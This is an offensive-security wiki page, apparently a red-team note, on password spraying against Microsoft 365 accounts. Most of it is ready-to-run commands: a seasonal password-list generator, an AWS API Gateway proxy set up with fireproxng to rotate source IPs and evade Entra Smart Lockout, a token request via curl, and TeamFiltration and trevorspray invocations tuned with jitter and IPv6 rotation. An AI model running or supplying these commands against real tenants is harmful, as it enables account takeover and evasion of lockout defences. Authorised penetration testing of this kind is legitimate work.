---
title: M365 Password Spraying
---

[[notes/m365/index]] [[notes/initial-access/index]] trough insecure passwords.

Generate a list of common passwords.

~~~ bash
exrex "($org_hq_location|Summer|Winter|Sommer|Winter|Welcome|Willkommen)($(date +%Y)|$(date -d 'last year' +%Y))\!|(Start|Password|Passwort)123\!"
~~~

Source IP rotation is required to evade Entra Smart Lockout.
For example via AWS API Gateway and [[notes/tools/fireproxng]].

~~~ bash
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_REGION=...
fireproxng list
fireproxng create https://login.windows.net/
curl -sS -H 'Accept: application/json' -H 'User-Agent: Windows-AzureAD-Authentication-Provider/1.0' https://$proxy_id.execute-api.eu-west-1.amazonaws.com/fireprox/$tenant_id/oauth2/token --data-urlencode resource=https://graph.windows.net -d client_id=38aa3b87-a06d-4817-b275-7a316988d93b -d client_info=1 -d grant_type=password -d scope=openid --data-urlencode username=john.doe@corp.com --data-urlencode password='passw0rd'
fireproxng delete $proxy_id
~~~

Or fully automated with [[notes/tools/teamfiltration]].

~~~ bash
./TeamFiltration --outpath ./corp --config ./config.json --spray --shuffle-regions --shuffle-users --shuffle-passwords --jitter 5 --sleep-min 65 --sleep-max 70 --passwords ./passwords.txt
~~~

[[notes/tools/trevorspray]] provides a similar capability by using large IPv6 subnets.

~~~ bash
trevorspray --prefer-ipv6 --subnet dead:beef::1/48 --random-useragent --url https://login.windows.net/$tenantid/oauth2/token -u ./emails.txt -p 'Start123!'
~~~

Untested tools:

- [RagingRotator](https://github.com/nickzer0/RagingRotator), alternative to `TeamFiltration`
- [gofireprox](https://github.com/mr-pmillz/gofireprox), alternative to `fireproxng`
- [fireprox](https://github.com/ustayready/fireprox), the original
